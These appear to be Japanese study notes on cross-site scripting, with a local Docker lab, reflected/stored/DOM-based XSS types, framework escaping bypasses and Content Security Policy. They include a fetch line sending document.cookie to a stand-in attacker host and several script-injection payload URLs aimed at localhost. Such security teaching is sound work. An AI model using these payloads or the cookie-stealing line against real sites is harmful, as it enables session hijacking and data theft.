## クロスサイトスクリプティングについて

### 概要

- XSS はクライアントからの入力値を基に動的に HTML を生成するような Web アプリケーションにおいて、生成される HTML に対してスクリプトを挿入可能である場合に発生するコードインジェクション系の脆弱性の一種。

- 例
  - クエリ文字列の name の値を参照し,`<p>Hello, nameの値！</p>`という HTML をレスポンスするアプリケーション

```bash
docker compose up
```

http://localhost:5002/?name=taro

ここで以下のようなクエリを送信するとどうなるのか。

`http://localhost:5002/?name=</p><script>alert("やあ^^")</script><p>`

- XSS 脆弱性を利用して挿入された Javascript プログラムは [SOP](https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy) による制約を受けることなく、その Web ページ上のコンテキストにおいて任意の処理を実行できてしまう。

  - セッションハイジャックなどが起こせてしまう。

  ```js
  fetch(`http://attaker.example.com?cookie=${document.cookie}`);
  ```

- [XSS の種別](https://siteguard.jp-secure.com/blog/protect-for-xss/)

  - 反射型 XSS
    - リクエストに含まれるクエリ文字やボディの一部の内容をレスポンスとする HTML に反映するような Web アプリケーションで発生する
    - 被害者のブラウザ上で実行したいスクリプトを含んだ HTML がレスポンスされるようなクエリ文字が設定された URL に誘導し、攻撃を実現
  - 蓄積柄 XSS
    - ユーザの入力ちがデータベース等の永続的なストレージに格納され、かつ、そのデータを基に HTML を生成するような Web アプリケーションにおいて発生する。
    - 攻撃者はスクリプトが実行されるようなメモをデータベースに保存しておき、そのメモにアクセスさせるような URL へと被害者を誘導する
  - DOM-based XSS
    - 反射型や蓄積型 XSS はサーバサイドで HTML を動的に派生する際に発生する XSS だったが、クライアントサイドでクエリ文字列に`location.search`やフラグメント識別子(`location.hash`)等を基に DOM を操作する際に発生する XSS

- web アプリケーションの実装に応じてスクリプトの挿入方法も考える必要がある

  - 単純なエコーバック
    - `http://localhost:5003/simple?name=<script>alert(1)</script>`
  - 入力値が属性値として出力される場合
    - `http://localhost:5003/attribute_without_quote?name=/><script>alert(1)</script>`
  - 入力値が DOM 操作に利用される場合
    - `http://localhost:5003/dom_based?<script>alert(1)</script>`
    - これは実行されない
    - [参考](https://developer.mozilla.org/ja/docs/Web/API/Element/innerHTML#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%81%AE%E8%80%83%E6%85%AE%E4%BA%8B%E9%A0%85)

- Web フロントエンドのフレームワークと DOM-based XSS
  - 今主流で使われている Web フロントエンドのフレームワークは、主にデータバインディング機能を提供することが特徴
  - 下記フレームワークを使う実装ではデータバインディングが多用されているので、デフォルトで出力値をエスケープする実装がなされている。
    - React
    - Vue.js
    - Angular
  - しかし、時にアプリケーション開発においては勝手にエスケープしないで欲しい場合がある（例えば、Markdown 記法で記述されたテキストを HTML としてレンダリングした上で表示したい場合など）
    - これを実現するための抜け道
      - React
        - [dangerouslySetInnerHTML](https://beta.reactjs.org/reference/react-dom/components/common#dangerously-setting-the-inner-html)
      - Vue.js
        - `v-html`ディレクティブ
        - `render` 関数における `domProps` や `domPropsInnerHTML`
      - Angular
        - (1.x 系)`ng-bind-html` ディレクティブ
        - (2.0 以降)`DomSanitizer.bypassSecurityTrustHtml`関数

### CSP: Content Security Policy

- CSP は XSS をはじめとする Content Injection 攻撃に対するリスクを軽減されるセキュリティレイヤー

  - 開発者は CSP を用いることで、特定の Web ページにおいて読み込みや実行などの処理を許可するコンテンツを明示的に指定できる
  - XSS が発生するそもそもの原因は、スクリプトを解釈して実行するブラウザが「どのスクリプトが正当な開発者にとって実行が意図されたもので、反対にどのスクリプトが攻撃者によって挿入されたものなのか」を判別できない点にあると言える

- CSP の仕様
  - CSP の配信
    - [HTTP レスポンスの Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
    - HTML ヘッダー内の meta 要素
  - ディレクティブ
    - CSP による制限を定義するための命令記法
    - `<directive-name> <directive-value>`のタプルで構成される
    - `script-src 'self' 'unsafe-inline' ....`
      - `Fetch Directives`: リソースの読み込みや実行に関する制限をかけたディレクティブ
      - `Document Directives`: ドキュメントやワーカーの状態に関するディレクティブ
      - `Navigation Directives`: ナビゲーションコンテキストに関する制限を提供するディレクトリ
      - `Reporting Directives`: 何らかの制限に違反した際にレポートを行う機能を提供するディレクティブ
